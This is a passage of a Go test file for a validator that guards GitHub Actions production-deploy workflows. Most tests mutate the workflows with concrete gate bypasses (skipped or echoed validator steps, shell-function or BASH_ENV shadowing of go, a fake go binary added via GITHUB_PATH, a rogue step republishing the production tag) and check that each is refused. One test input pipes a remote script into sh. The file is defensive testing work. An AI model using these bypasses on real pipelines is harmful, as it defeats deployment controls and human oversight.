package main

import (
	"bytes"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func repoFile(t *testing.T, rel string) string {
	t.Helper()
	data, err := os.ReadFile(filepath.Join("..", "..", rel))
	if err != nil {
		t.Fatalf("read %s: %v", rel, err)
	}
	return string(data)
}

func TestRealDRPublicationSatisfiesTheContract(t *testing.T) {
	t.Parallel()

	if err := validateDRWorkflow(repoFile(t, ".github/workflows/dr-rebuild.yaml")); err != nil {
		t.Fatalf("shipped dr-rebuild.yaml violates the publication contract: %v", err)
	}
	if err := validatePublicationAction(repoFile(t, ".github/actions/deploy-prod/publish-platform-manifests/action.yml")); err != nil {
		t.Fatalf("shipped publication action violates the publication contract: %v", err)
	}
}

func TestRealClusterConfigAllowsTheDRIdentity(t *testing.T) {
	t.Parallel()

	if err := validateVerifyAllowList(repoFile(t, "ksail.prod.yaml")); err != nil {
		t.Fatalf("shipped ksail.prod.yaml violates the allow-list contract: %v", err)
	}
}

func TestRealDirectPushWorkflowIsGatedByTheContract(t *testing.T) {
	t.Parallel()

	if err := validateCDWiring(cdWorkflow(t), deployAction(t)); err != nil {
		t.Fatalf("shipped cd.yaml can deploy to production without the publication contract: %v", err)
	}
}

func cdWorkflow(t *testing.T) string { t.Helper(); return repoFile(t, ".github/workflows/cd.yaml") }
func deployAction(t *testing.T) string {
	t.Helper()
	return repoFile(t, ".github/actions/deploy-prod/action.yml")
}

// TestMisorderedPublicationIsRefusedOnTheDirectPushPath is the end-to-end
// property #2879 asks for: a deliberately mis-ordered publication must be
// refused on the CD route, not merely on the PR route.
//
// 🔴 IT DRIVES run() OVER A REAL TREE, and the earlier version did not — it
// ablated the publisher, checked the ablation separately, then called
// validateCDWiring with the SHIPPED files. The misordered string never reached
// the thing under test, so the second half merely repeated
// TestRealDirectPushWorkflowIsGatedByTheContract and the test as a whole proved
// only that two independent facts each held. That is the vacuous shape this
// file exists to catch, and it survived here for a round.
func TestMisorderedPublicationIsRefusedOnTheDirectPushPath(t *testing.T) {
	t.Parallel()

	// Baseline: the faithful copy must PASS, or the refusal below could be
	// caused by the copying rather than by the ablation.
	clean := repoTreeCopy(t, nil)
	var stdout, stderr bytes.Buffer
	if code := run(
		filepath.Join(clean, ".github/workflows/dr-rebuild.yaml"),
		filepath.Join(clean, "ksail.prod.yaml"),
		&stdout, &stderr,
	); code != 0 {
		t.Fatalf("faithful copy of the shipped tree must pass, got %d: %s", code, stderr.String())
	}

	// Push straight to the promoted reference instead of the staging one — the
	// exact ordering defect #2627 tracks — and drive the whole CLI over it.
	misordered := repoTreeCopy(t, map[string]func(string) string{
		".github/actions/deploy-prod/publish-platform-manifests/action.yml": func(body string) string {
			return strings.Replace(body, `workload push "${STAGING_OCI_REF}"`, `workload push "${PROMOTED_OCI_REF}"`, 1)
		},
	})
	stdout.Reset()
	stderr.Reset()
	code := run(
		filepath.Join(misordered, ".github/workflows/dr-rebuild.yaml"),
		filepath.Join(misordered, "ksail.prod.yaml"),
		&stdout, &stderr,
	)
	if code == 0 {
		t.Fatal("a mis-ordered publication was accepted on the direct-push path")
	}
	if !strings.Contains(stderr.String(), "staging") {
		t.Fatalf("refusal does not name the ordering defect: %q", stderr.String())
	}
}

// repoTreeCopy materialises the files the CLI reads into a temp tree, applying
// an optional per-path mutation. Copying rather than mutating in place is what
// lets the test drive the real entry point without touching the repository.
func repoTreeCopy(t *testing.T, mutate map[string]func(string) string) string {
	t.Helper()
	root := t.TempDir()
	for _, rel := range []string{
		".github/workflows/dr-rebuild.yaml",
		".github/workflows/cd.yaml",
		".github/workflows/ci.yaml",
		".github/actions/deploy-prod/action.yml",
		".github/actions/deploy-prod/publish-platform-manifests/action.yml",
		"ksail.prod.yaml",
	} {
		body := repoFile(t, rel)
		if mutate != nil {
			if apply, ok := mutate[rel]; ok {
				mutated := apply(body)
				if mutated == body {
					t.Fatalf("%s: mutation changed nothing; re-aim it rather than trusting the result", rel)
				}
				body = mutated
			}
		}
		dest := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(dest), 0o750); err != nil {
			t.Fatalf("mkdir %s: %v", dest, err)
		}
		if err := os.WriteFile(dest, []byte(body), 0o600); err != nil {
			t.Fatalf("write %s: %v", dest, err)
		}
	}
	return root
}

func TestCDWiringRejectsEachAblation(t *testing.T) {
	t.Parallel()

	cd := cdWorkflow(t)
	action := deployAction(t)
	if err := validateCDWiring(cd, action); err != nil {
		t.Fatalf("precondition: the shipped workflow must PASS before ablating it: %v", err)
	}

	// Each ablation removes exactly one link in the chain that makes the gate
	// real, and each must be refused. The last four were raised by Codex against
	// the text-scanning version of this check, and every one of them left a
	// workflow that READ as gated — which is what makes them worth pinning
	// rather than fixing quietly.
	for name, ablate := range map[string]func(string, string) (string, string){
		"unwired": func(w, a string) (string, string) {
			return strings.Replace(w, "        validate-publication-contract,\n", "", 1), a
		},
		"gate job removed": func(w, a string) (string, string) {
			return strings.Replace(w, "  validate-publication-contract:", "  unrelated-job:", 1), a
		},
		"gate no longer runs the validator": func(w, a string) (string, string) {
			return strings.Replace(w, "go run ./scripts/validate-dr-signing", "echo skipped", 1), a
		},
		"deploy no longer uses the shared action": func(w, a string) (string, string) {
			return strings.Replace(w, "uses: ./.github/actions/deploy-prod\n", "uses: ./.github/actions/other\n", 1), a
		},
		"deploy uses a SIBLING action with the same prefix": func(w, a string) (string, string) {
			return strings.Replace(w, "uses: ./.github/actions/deploy-prod\n", "uses: ./.github/actions/deploy-prod-canary\n", 1), a
		},
		"deploy uses a NESTED action under the same path": func(w, a string) (string, string) {
			return strings.Replace(
				w, "uses: ./.github/actions/deploy-prod\n",
				"uses: ./.github/actions/deploy-prod/publish-platform-manifests\n", 1,
			), a
		},
		// Codex P2: the gate ECHOES the command instead of running it. Exits 0,
		// validates nothing, and a substring scan of the run block accepts it.
		"gate ECHOES the validator instead of running it": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml",
				`          echo "go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml"`,
				1,
			), a
		},
		// Codex P2: the dependency is deleted, but text that LOOKS like it
		// survives elsewhere in the job. A line scan reports a dependency
		// GitHub does not have.
		"needs deleted while a heredoc still contains the text": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"    needs:\n      [\n        validate-eks-authorization,\n"+
					"        validate-publication-contract,\n"+
					"        validate-talos-kubernetes-compatibility,\n"+
					"        validate-ghcr-fanout-component-gate,\n      ]",
				"    needs: [validate-eks-authorization, validate-talos-kubernetes-compatibility, validate-ghcr-fanout-component-gate]\n"+
					"    env:\n      NOTE: \"needs: [validate-publication-contract]\"",
				1,
			), a
		},
		// Codex P2, and the most dangerous of the set: `needs` is intact and
		// `if: always()` schedules the deploy after the gate FAILS. Membership
		// alone cannot see it, and the workflow reads entirely correct.
		"deploy carries a job-level condition that survives a failed gate": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"        validate-ghcr-fanout-component-gate,\n      ]",
				"        validate-ghcr-fanout-component-gate,\n      ]\n    if: always()",
				1,
			), a
		},
		// Codex P2, round 2: the SAME class as the job-level condition below,
		// one level down. The step carries the right command and never runs it,
		// or runs it and suppresses the failure — either way the workflow reads
		// as gated and `needs` is satisfied.
		"validator step is skipped by a step condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        if: false\n",
				1,
			), a
		},
		"validator step suppresses its own failure": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        continue-on-error: true\n",
				1,
			), a
		},
		"gate JOB is skipped by a job condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    if: false\n",
				1,
			), a
		},
		"gate JOB suppresses its own failure": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    continue-on-error: true\n",
				1,
			), a
		},
		// CodeRabbit P1 and Codex P2, round 9, reported INDEPENDENTLY against
		// this same head — the SIXTH shape of "the line is present but does it
		// run", and the one that finally says the denylist was the wrong
		// mechanism. `go()` `{` `}` carry no rejected keyword and no rejected
		// operator, so the block is accepted; bash resolves the FUNCTION before
		// the executable, so both required lines run and neither validator does.
		"gate SHADOWS go with a shell function so neither validator executes": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          go()\n          {\n            true\n          }\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// The same bypass in its non-invoking spelling: the required lines are
		// hidden INSIDE a function body that is never called, and a succeeding
		// command follows. Kept as a separate arm because it defeats a fix that
		// only refuses a function whose name collides with a required command.
		"gate BURIES both validators in an uninvoked function body": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          validator_noop()\n          {\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 3: the THIRD shape of "the line is present but does it
		// run". Whole-line equality closed the quoted case, step metadata closed
		// the skipped case, and neither says the SHELL reaches it.
		"validator command sits after an early exit": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          exit 0\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		"validator command is wrapped in a false conditional": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          if false; then\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 3: the composite action was still SCANNED while
		// cd.yaml was parsed — a heredoc in a run block carries the exact
		// `uses:` text while the action invokes nothing of the sort.
		"publisher uses: text survives only inside a heredoc": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      run: |\n        cat <<'EOF'\n        uses: ./.github/actions/deploy-prod/publish-platform-manifests\n        EOF",
				1,
			)
		},
		// Codex P2, round 4: a here-doc contains the validator line verbatim
		// while the step only PRINTS it. Redirection joins the operator set.
		"validator command is inside a here-doc": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          cat <<'EOF'\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// Codex P2, round 4: the DEPLOY step — the same skip/suppression
		// question already asked of the validator step, at the cell I had not
		// swept. A skipped deploy step still names the shared action.
		"deploy step is skipped by a step condition": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🚀 Deploy to Production\n        # The deploy logic",
				"      - name: 🚀 Deploy to Production\n        if: false\n        # The deploy logic",
				1,
			), a
		},
		// Codex P2, round 5: the FOURTH matched step whose metadata I discarded —
		// the nested publisher itself. Skipping it lets the shared action pass
		// straight over the stage/sign/attest/promote transaction and carry on
		// into reconciliation. requireEnforcedStep now makes this cell, and any
		// future one, unrepresentable.
		"nested publisher step is skipped": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      if: false\n      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				1,
			)
		},
		"nested publisher step suppresses failure": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"      continue-on-error: true\n      uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				1,
			)
		},
		// CodeRabbit P1: `set +e` runs the validator and DISCARDS its verdict,
		// then a later succeeding line carries the step to exit 0. The fifth
		// shape of "does this command count" — quoted, skipped, unreached,
		// printed, and now ignored.
		"validator failure is discarded by set +e": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"          go test ./scripts/validate-dr-signing\n",
				"          set +e\n          go test ./scripts/validate-dr-signing\n",
				1,
			), a
		},
		// ...and the same question one key over.
		"validator step overrides the shell": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        shell: bash {0}\n",
				1,
			), a
		},
		// CodeRabbit P1: the same key one SCOPE out. Refusing `steps[*].shell`
		// leaves `defaults.run.shell` untouched at both job and workflow scope,
		// and GitHub applies those to the very step this gate depends on. A
		// custom template such as `bash {0}` takes full control of the shell
		// options, so the default `-e` is gone and the trailing `true` carries
		// a FAILED validator to exit 0. Both scopes get their own arm: they are
		// separate keys in separate maps, and a fix that reads one and not the
		// other passes whichever arm it happens to cover.
		"job-level defaults.run.shell discards the validator verdict": func(w, a string) (string, string) {
			w = strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash {0}\n",
				1,
			)
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n",
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n          true\n",
				1,
			), a
		},
		"workflow-level defaults.run.shell discards the validator verdict": func(w, a string) (string, string) {
			w = strings.Replace(
				w,
				"\njobs:\n",
				"\ndefaults:\n  run:\n    shell: bash {0}\n\njobs:\n",
				1,
			)
			return strings.Replace(
				w,
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n",
				"          go run ./scripts/validate-dr-signing .github/workflows/dr-rebuild.yaml ksail.prod.yaml\n          true\n",
				1,
			), a
		},
		// Codex P2: `BASH_ENV` names a file bash sources before running the
		// script, and the runner's default `bash -e {0}` is non-interactive, so
		// the sourced file is in force for the gate's own commands. A `go()`
		// function defined there shadows the executable exactly as the sixth
		// round's inline shadow did — except the allowlist never sees it,
		// because the run block still contains only the two permitted lines.
		// Each scope is its own arm for the reason the shell arms give: they are
		// separate keys in separate maps.
		"step-level env sources a go shadow into the gate's shell": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 🖋️ Validate DR signing contract\n        env:\n          BASH_ENV: .ci/shadow-go.sh\n",
				1,
			), a
		},
		"job-level env sources a go shadow into the gate's shell": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n",
				"  validate-publication-contract:\n    name: 🖋️ Validate Publication Contract\n    runs-on: ubuntu-latest\n    env:\n      BASH_ENV: .ci/shadow-go.sh\n",
				1,
			), a
		},
		"workflow-level env sources a go shadow into the gate's shell": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"\njobs:\n",
				"\nenv:\n  BASH_ENV: .ci/shadow-go.sh\n\njobs:\n",
				1,
			), a
		},
		// The same environment, reached without an `env:` key anywhere. A step
		// earlier in the gate job writes to the runner's own `$GITHUB_ENV` /
		// `$GITHUB_PATH` bridges, which apply to every LATER step — so the
		// validator step's shell starts shadowed while the validator step itself
		// is byte-for-byte unchanged and passes every existing check.
		"an earlier gate step exports BASH_ENV through the runner bridge": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 😈 Stage a go shadow\n        run: |\n"+
					"          printf 'go() { true; }\\n' > /tmp/shadow-go.sh\n"+
					"          echo \"BASH_ENV=/tmp/shadow-go.sh\" >> \"$GITHUB_ENV\"\n\n"+
					"      - name: 🖋️ Validate DR signing contract\n",
				1,
			), a
		},
		"an earlier gate step prepends a fake go through the runner bridge": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🖋️ Validate DR signing contract\n",
				"      - name: 😈 Stage a fake go\n        run: |\n"+
					"          mkdir -p /tmp/bin\n"+
					"          printf '#!/bin/sh\\nexit 0\\n' > /tmp/bin/go\n"+
					"          chmod +x /tmp/bin/go\n"+
					"          echo /tmp/bin >> \"$GITHUB_PATH\"\n\n"+
					"      - name: 🖋️ Validate DR signing contract\n",
				1,
			), a
		},
		// Codex P2: the contract is checked against the nested publisher, so it
		// only means anything while the shared action still calls it. Otherwise
		// the validator verifies an unused file and reports success.
		"shared action no longer invokes the checked publisher": func(w, a string) (string, string) {
			return w, strings.Replace(
				a, "uses: ./.github/actions/deploy-prod/publish-platform-manifests",
				"uses: ./.github/actions/deploy-prod/some-other-publisher", 1,
			)
		},
		// Codex P2 on #2939, tracked as #2942: every check above proves the
		// checked publisher is PRESENT and enforced. None of them proves it is
		// the ONLY step that writes the tag production follows, so a second
		// writer appended after it replaces the promoted digest while the whole
		// ordering contract still reports success.
		"a later step in the shared action overwrites latest": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"    - name: 🔎 Verify Flux GHCR pull credential after publish\n",
				"    - name: 😈 Republish latest outside the checked publisher\n"+
					"      shell: bash\n"+
					"      run: |\n"+
					"        ksail workload push oci://ghcr.io/devantler-tech/platform/manifests:latest\n\n"+
					"    - name: 🔎 Verify Flux GHCR pull credential after publish\n",
				1,
			)
		},
		// One level up: the calling job delegates publication wholly to the
		// shared action, so a writer added beside that delegation reaches the
		// same tag without entering the checked action at all.
		// A DUPLICATE publisher is checked by neither rule: requireEnforcedStep
		// validates only the first match, and the exclusivity rule skips every
		// match. Both routes accepted this before requireSolePublisher counted.
		"a second publisher step in the shared action": func(w, a string) (string, string) {
			return w, strings.Replace(
				a,
				"    - name: 🔎 Verify Flux GHCR pull credential after publish\n",
				"    - name: 😈 Second publisher, unchecked\n"+
					"      uses: ./.github/actions/deploy-prod/publish-platform-manifests\n\n"+
					"    - name: 🔎 Verify Flux GHCR pull credential after publish\n",
				1,
			)
		},
		"a second delegation in the direct-push job": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🚀 Deploy to Production\n",
				"      - name: 😈 Second delegation, unchecked\n"+
					"        uses: ./.github/actions/deploy-prod\n\n"+
					"      - name: 🚀 Deploy to Production\n",
				1,
			), a
		},
		"a step beside the direct-push delegation overwrites latest": func(w, a string) (string, string) {
			return strings.Replace(
				w,
				"      - name: 🚀 Deploy to Production\n",
				"      - name: 😈 Republish latest beside the shared action\n"+
					"        run: |\n"+
					"          docker buildx imagetools create --tag ghcr.io/devantler-tech/platform/manifests:latest scratch\n\n"+
					"      - name: 🚀 Deploy to Production\n",
				1,
			), a
		},
	} {
		t.Run(name, func(t *testing.T) {
			ablatedCD, ablatedAction := ablate(cd, action)
			if ablatedCD == cd && ablatedAction == action {
				t.Fatalf("ablation changed nothing; re-aim it rather than trusting the result")
			}
			if err := validateCDWiring(ablatedCD, ablatedAction); err == nil {
				t.Fatal("ablation was accepted, so the check does not constrain it")
			}
		})
	}
}

func TestMergeQueueProductionRoutesUseTheCheckedAction(t *testing.T) {
	t.Parallel()

	ci := repoFile(t, ".github/workflows/ci.yaml")
	if err := validateProductionRoutes(ci); err != nil {
		t.Fatalf("shipped ci.yaml can reach production outside the checked action: %v", err)
	}

	// 🔴 The premise of this contract is that the guarantee is only as strong as
	// its weakest ROUTE, and until this round it checked one of the two. Codex
	// reproduced the gap: replacing only the merge-queue job's shared-action
	// call passed every check here while the direct-push route stayed gated.
	for name, ablate := range map[string]func(string) string{
		"merge-queue deploy uses a different action": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        uses: ./.github/actions/other\n", 1)
		},
		"merge-queue heal uses a different action": func(s string) string {
			// The SECOND occurrence is the healing job; replace it by cutting at
			// the first and rejoining, so the arm cannot silently hit the wrong one.
			first := strings.Index(s, "        uses: ./.github/actions/deploy-prod\n")
			if first < 0 {
				// Return the input unchanged rather than calling t.Fatal on the OUTER T from
				// inside the subtest closure: that runs runtime.Goexit on the subtest goroutine
				// while marking the parent failed, and `testing` then reports a confusing
				// "test executed panic(nil) or runtime.Goexit" instead of the real reason. The
				// caller already refuses an ablation that changed nothing, against the subtest.
				return s
			}
			cut := first + len("        uses: ./.github/actions/deploy-prod\n")
			return s[:cut] + strings.Replace(s[cut:], "        uses: ./.github/actions/deploy-prod\n", "        uses: ./.github/actions/other\n", 1)
		},
		"merge-queue deploy step is skipped": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        if: false\n        uses: ./.github/actions/deploy-prod\n", 1)
		},
		"merge-queue deploy step suppresses failure": func(s string) string {
			return strings.Replace(s, "        uses: ./.github/actions/deploy-prod\n", "        continue-on-error: true\n        uses: ./.github/actions/deploy-prod\n", 1)
		},
		// Codex P2, round 9. The direct-push route refuses ANY job-level
		// condition on deploy-prod; this route deliberately permits one, because
		// `merge_group` gating is legitimate — and that carve-out was total.
		// `always()` makes the deploy eligible after `changes` FAILS, and the
		// signing validator runs inside `changes`, so the publishing job runs
		// behind a gate that already failed while this check reports success.
		"merge-queue deploy overrides a failed dependency with always()": func(s string) string {
			return strings.Replace(
				s,
				"    if: github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
				"    if: always() && github.event_name == 'merge_group' && needs.changes.outputs.k8s == 'true'",
				1,
			)
		},
		// #2942 on the route production normally takes. Requiring the job to
		// USE the checked action says nothing about what else the job does, so
		// a second writer beside the delegation reaches the mutable tag while
		// every rule above stays satisfied.
		// Same duplicate-publisher gap on the route production normally takes.
		"a second delegation in the merge-queue job": func(s string) string {
			return strings.Replace(
				s,
				"      - name: 🚀 Deploy to Production\n",
				"      - name: 😈 Second delegation, unchecked\n"+
					"        uses: ./.github/actions/deploy-prod\n\n"+
					"      - name: 🚀 Deploy to Production\n",
				1,
			)
		},
		"a step beside the merge-queue delegation overwrites latest": func(s string) string {
			return strings.Replace(
				s,
				"      - name: 🚀 Deploy to Production\n",
				"      - name: 😈 Republish latest beside the shared action\n"+
					"        run: |\n"+
					"          docker buildx imagetools create --tag ghcr.io/devantler-tech/platform/manifests:latest scratch\n\n"+
					"      - name: 🚀 Deploy to Production\n",
				1,
			)
		},
	} {
		t.Run(name, func(t *testing.T) {
			ablated := ablate(ci)
			if ablated == ci {
				t.Fatal("ablation changed nothing; re-aim it rather than trusting the result")
			}
			if err := validateProductionRoutes(ablated); err == nil {
				t.Fatal("ablation was accepted, so the check does not constrain it")
			}
		})
	}

	// The job-level condition rule must NOT apply here: ci.yaml gates its deploy
	// on `merge_group`, which is legitimate and necessary. Asserting the shipped
	// file passes (above) is what pins that — but state it, or a later round may
	// "tighten" this into rejecting the real workflow.
}

// TestDependencyStatusOverrideRefusalSeparatesFunctionsFromComparisons pins the
// distinction the refusal rests on. Refusing every mention of "failure" would
// also refuse `needs.x.result == 'failure'`, which overrides nothing — and the
// heal job's own real condition contains exactly that, so getting this wrong
// breaks the shipped workflow rather than some hypothetical one.
func TestDependencyStatusOverrideRefusalSeparatesFunctionsFromComparisons(t *testing.T) {
	t.Parallel()

	gated := mergeQueueProductionJob{name: "deploy-prod"}
	exempt := mergeQueueProductionJob{name: "heal-prod-on-failure", mayOverrideDependencyStatus: true}

	allowed := map[string]any{
		"no condition at all":     nil,
		"a plain event gate":      "github.event_name == 'merge_group'",
		"a result COMPARISON":     "needs.deploy-prod.result == 'failure'",
		"a success() assertion":   "success() && github.event_name == 'merge_group'",
		"an unrelated identifier": "needs.changes.outputs.always == 'true'",
	}
	for name, condition := range allowed {
		job := map[string]any{}
		if condition != nil {
			job["if"] = condition
		}
		if err := refuseDependencyStatusOverride(job, gated); err != nil {
			t.Fatalf("%s must be accepted, or the guard refuses correct work: %v", name, err)
		}
	}

	refused := map[string]string{
		"always":              "always() && github.event_name == 'merge_group'",
		"failure":             "failure() && needs.changes.outputs.k8s == 'true'",
		"cancelled":           "!cancelled()",
		"wrapped in ${{ }}":   "${{ always() }}",
		"spelled with spaces": "always ()",
		"upper-cased":         "ALWAYS()",
	}
	for name, condition := range refused {
		if err := refuseDependencyStatusOverride(map[string]any{"if": condition}, gated); err == nil {
			t.Fatalf("%s must be refused on a job that publishes on the success path", name)
		}
		// ...and the exemption must still let the heal job through, or the
		// carve-out is not actually doing anything.
		if err := refuseDependencyStatusOverride(map[string]any{"if": condition}, exempt); err != nil {
			t.Fatalf("%s must remain allowed on the unsuccessful-path heal job: %v", name, err)
		}
	}
}

func TestParsedHelpersFailClosedOnShapesTheyCannotRead(t *testing.T) {
	t.Parallel()

	// The failure direction that matters for all three: a shape the helper
	// cannot read must report absence, never presence. An unrecognised workflow
	// style reading as "gated" is the one outcome that lets a deploy through.
	if stringListContains(map[string]any{"a": true}, "a") {
		t.Fatal("a mapping must not satisfy a sequence membership test")
	}
	if stringListContains(nil, "a") {
		t.Fatal("an absent value must not satisfy a membership test")
	}
	if !stringListContains([]any{"x", "validate-publication-contract"}, "validate-publication-contract") {
		t.Fatal("a real sequence entry must satisfy it")
	}
	if !stringListContains("validate-publication-contract", "validate-publication-contract") {
		t.Fatal("the lone-scalar needs form must satisfy it")
	}

	// runsCommand: the command quoted inside another command is not run.
	if runsCommand("go run ./x")(map[string]any{"run": "echo \"go run ./x\"\n"}) {
		t.Fatal("an echoed command must not count as executed")
	}
	if !runsCommand("go run ./x")(map[string]any{"run": "go test ./x\ngo run ./x\n"}) {
		t.Fatal("a command on its own run line must count as executed")
	}

	// enforcesFailure: both suppression shapes are refused, and the plain node
	// is accepted — the second half matters, or the check could be refusing
	// everything and still look correct.
	if enforcesFailure(map[string]any{"if": "false"}, "x") == nil {
		t.Fatal("a condition must be refused")
	}
	if enforcesFailure(map[string]any{"continue-on-error": true}, "x") == nil {
		t.Fatal("continue-on-error: true must be refused")
	}
	if err := enforcesFailure(map[string]any{"continue-on-error": false}, "x"); err != nil {
		t.Fatalf("an explicit continue-on-error: false is not suppression: %v", err)
	}
	if err := enforcesFailure(map[string]any{"run": "go test ./x"}, "x"); err != nil {
		t.Fatalf("a plain node must be accepted: %v", err)
	}

	// usesAction: equality, so a prefix-sharing sibling is a different action.
	if usesAction("./a/b")(map[string]any{"uses": "./a/b-canary"}) {
		t.Fatal("a sibling path sharing a prefix must not satisfy an action check")
	}
	if usesAction("./a/b")(map[string]any{"uses": "./a/b/c"}) {
		t.Fatal("a nested path must not satisfy an action check")
	}
	// POSITIVE case — without it a usesAction that always returned false
	// would pass both assertions above. Same argument as the enforcesFailure
	// positive case; it applies here too and I had not applied it.
	if !usesAction("./a/b")(map[string]any{"uses": "./a/b"}) {
		t.Fatal("the exact action path must satisfy an action check")
	}

	// 🔴 requireEnforcedStep is where matching and enforcing became ONE
	// operation, after four review rounds each found a different matched step
	// whose metadata had been discarded. These assert that they cannot be
	// separated again: a matching-but-skipped step is an ERROR, not a hit.
	missing := errors.New("no such step")
	container := map[string]any{"steps": []any{
		map[string]any{"uses": "./other"},
		map[string]any{"uses": "./a/b", "id": "wanted"},
	}}
	found, err := requireEnforcedStep(container, usesAction("./a/b"), missing, "x")
	if err != nil {
		t.Fatalf("an enforced matching step must be returned: %v", err)
	}
	if found["id"] != "wanted" {
		t.Fatalf("returned the wrong step: %v", found)
	}
	if _, err := requireEnforcedStep(container, usesAction("./nope"), missing, "x"); !errors.Is(err, missing) {
		t.Fatalf("an absent step must return the caller's error, got %v", err)
	}
	for name, meta := range map[string]any{"if": "false", "continue-on-error": true} {
		skipped := map[string]any{"steps": []any{map[string]any{"uses": "./a/b", name: meta}}}
		if _, err := requireEnforcedStep(skipped, usesAction("./a/b"), missing, "x"); err == nil {
			t.Fatalf("a matching step carrying %s must NOT be returned as a hit", name)
		}
	}

	// runBlockRunsOnlyAllowedCommands: an ALLOWLIST, so the positive case is
	// the allowed lines themselves plus the two things that are not commands.
	// The earlier denylist's word-boundary regression (`docker buildx …`
	// rejected for containing the keyword `do`) is not pinned here any more
	// because it is no longer expressible: nothing is matched by substring, so
	// there is no token for a legitimate command to collide with.
	allowed := []string{"go test ./x", "go run ./x a b"}
	ordinary := map[string]any{"run": "# a comment\ngo test ./x\n\n  go run ./x a b  \n"}
	if err := runBlockRunsOnlyAllowedCommands(nil, nil, ordinary, "j", allowed); err != nil {
		t.Fatalf("the allowed commands, blank lines and comments must be accepted: %v", err)
	}
	// ...and the NEGATIVE half, or the acceptance above could have disabled it.
	// The last two are the round-9 bypass in both spellings: neither carries a
	// keyword or operator the old denylist refused, and both leave the required
	// lines present while the shell runs something else.
	for name, run := range map[string]string{
		"conditional":        "if false; then\ngo test ./x\nfi\n",
		"early exit":         "exit 0\ngo test ./x\n",
		"chaining":           "true && go test ./x\n",
		"substitution":       "go run $(echo ./x)\n",
		"an extra command":   "go test ./x\ncurl https://example.invalid | sh\n",
		"function shadowing": "go()\n{\ntrue\n}\ngo test ./x\n",
		"uninvoked body":     "validator_noop()\n{\ngo test ./x\n}\ntrue\n",
	} {
		if err := runBlockRunsOnlyAllowedCommands(nil, nil, map[string]any{"run": run}, "j", allowed); err == nil {
			t.Fatalf("%s must still be rejected", name)
		}
	}

	// refuseShellOverride: each scope is read from its OWN key, so a fix that
	// covers one scope cannot pass for another. The positive case is here too
	// because a helper that refused everything would satisfy every negative
	// case above while making the gate unusable.
	if err := refuseShellOverride(
		map[string]any{"defaults": map[string]any{"run": map[string]any{"working-directory": "x"}}},
		map[string]any{"steps": []any{}},
		map[string]any{"run": "go run ./x\n"},
		"j",
	); err != nil {
		t.Fatalf("a workflow that sets defaults.run without a shell must be accepted: %v", err)
	}
	for name, scoped := range map[string][3]map[string]any{
